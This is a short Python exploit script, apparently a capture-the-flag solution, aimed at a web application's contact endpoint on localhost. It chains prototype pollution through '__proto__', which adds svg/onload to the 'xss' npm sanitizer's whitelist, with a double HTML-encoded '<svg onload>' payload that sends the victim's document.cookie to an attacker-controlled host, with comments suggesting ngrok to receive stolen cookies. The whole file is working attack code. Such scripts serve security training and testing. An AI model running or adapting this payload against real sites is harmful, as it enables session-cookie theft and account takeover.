import requests

# insert your attacker controlled host here that is currently listening
# also possible to use a service such as ngrok to receive the stolen cookie
HOST = "http://localhost:9999"


# html encode every character in a provided string
def html_encode(string):
    return "".join(f"&#{ord(c)};" for c in string)


# javascript to steal the cookie and send it to an attacker controlled location
payload = f"document.location='{HOST}/?c='+document.cookie"

# double html encode the payload to bypass the filter which replaces any c's.
# this works because the `xss` npm package has a documented issue where it
# escapes whitelisted tags and doesn't re-escape them
payload = html_encode(html_encode(payload))

# use svg/onload rather than script/src in order to bypass the same c filter
payload = f"<svg onload={payload}>" 

# use the __proto__ field to pollute the global object and add svg/onload
# to the allowed tags whitelist so that the XSS filter doesn't escape it.
# also set emergency to true so that the hero views the message and triggers
# the XSS which steals the cookie
data = {
        "__proto__": {"whiteList": {"svg": ["onload"]}},
        "emergency": True, 
        "message": payload
}

requests.post("http://localhost:8080/contact", json=data)
